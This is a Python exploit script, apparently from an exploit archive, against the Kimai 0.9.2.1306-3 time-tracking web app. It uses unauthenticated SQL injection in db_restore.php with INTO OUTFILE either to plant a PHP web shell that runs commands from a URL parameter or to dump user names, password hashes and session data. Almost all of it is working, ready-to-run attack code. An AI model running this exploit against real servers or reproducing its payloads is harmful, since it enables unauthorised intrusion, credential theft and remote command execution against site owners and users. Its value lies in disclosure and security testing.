# Date: 05/20/2013
# Exploit Author: drone (@dronesec)
# Vendor Homepage: http://www.kimai.org/
# Software Link: https://downloads.sourceforge.net/project/kimai/0.9.x/kimai.0.9.2.1306-3.zip 
# Version: 0.9.2.1306-3
# Fixed in: source repositories (https://github.com/kimai/kimai)
# Tested on: Windows XP SP3, Ubuntu 12.04 (apparmor disabled)

"""
    This doesn&#039;t even require authentication to the
    web app, as the file is accessible to any user.

    Modify paths accordingly if running against Windows

    @dronesec
"""
from argparse import ArgumentParser
import string
import random
import urllib2
import sys
import re

def webshell(options, id):
    """ dat webshell
    """
    shell = &#039;&#039;.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
    sqli = (&#039;http://{0}/kimai/db_restore.php?dates%5B%5D={1}_kimai_var%20UNION&#039;
    &#039;%20SELECT%20\&#039;<?php%20system($_GET["rr"]);?>\&#039;%20FROM%20kimai_usr&#039;
    &#039;%20INTO%20OUTFILE%20\&#039;{2}/{3}.php\&#039;;--%20&submit=recover&#039;)

    urllib2.urlopen(sqli.format(options.ip, id, options.path, shell))
    print &#039;[!] Shell dropped.  Go hit http://%s/kimai/%s.php?rr=ls&#039;%(options.ip, shell)

def fetch_id(options):
    id = None
    try:
        page = urllib2.urlopen(&#039;http://%s/kimai/db_restore.php&#039;%options.ip).read()
        id = re.findall(&#039;name="dates\[\]" value=\"(.*?)\">&#039;, page)[0]
    except: pass
    return id

def run(options):
    # poll URL for valid backup id
    id = None
    while id is None:
        id = fetch_id(options)
        if id is None:
            print &#039;[-] No backups found, creating one...&#039;
            urllib2.urlopen(&#039;http://%s/kimai/db_restore.php?submit=create+backup&#039;%options.ip)

    print &#039;[!] Using backup id&#039;, id

    if options.shell:
        return webshell(options, id)

    print &#039;[!] Running queries...&#039;

    # execute sqli
    sqli = (&#039;http://{0}/kimai/db_restore.php?dates%5B%5D={1}_kimai_var%20UNION&#039;
    &#039;%20SELECT%20{3}%20FROM%20kimai_usr%20INTO%20OUTFILE%20\&#039;{2}/{3}\&#039;;--%20&submit=recover&#039;)

    urllib2.urlopen(sqli.format(options.ip, id, options.path, &#039;usr_name&#039;))

    # execute sqli; hashes
    urllib2.urlopen(sqli.format(options.ip, id, options.path, &#039;pw&#039;))

    # get sessions
    urllib2.urlopen(sqli.format(options.ip, id, options.path, &#039;secure&#039;))

    print &#039;[!] Go grab your files:\n\t{0}/usr_names\n\t{0}/pw\n\t{0}/secure&#039;\
                    .format(options.path)

def parse():
    parser = ArgumentParser()
    parser.add_argument(&#039;-i&#039;, help=&#039;server address&#039;, action=&#039;store&#039;, dest=&#039;ip&#039;)
    parser.add_argument(&#039;-p&#039;, help=&#039;path to dump files (otherwise guesses /var/www/kimai)&#039;,
                        action=&#039;store&#039;,default=&#039;/var/www/kimai&#039;, dest=&#039;path&#039;)
    parser.add_argument(&#039;-w&#039;, help=&#039;web shell&#039;, action=&#039;store_true&#039;, dest=&#039;shell&#039;)

    options = parser.parse_args()

    if not options.ip:
        parser.print_help()
        sys.exit(1)

    options.path = options.path if options.path[-1] != &#039;/&#039; else options.path[:-1]
    return options

if __name__ == "__main__":
    run(parse())

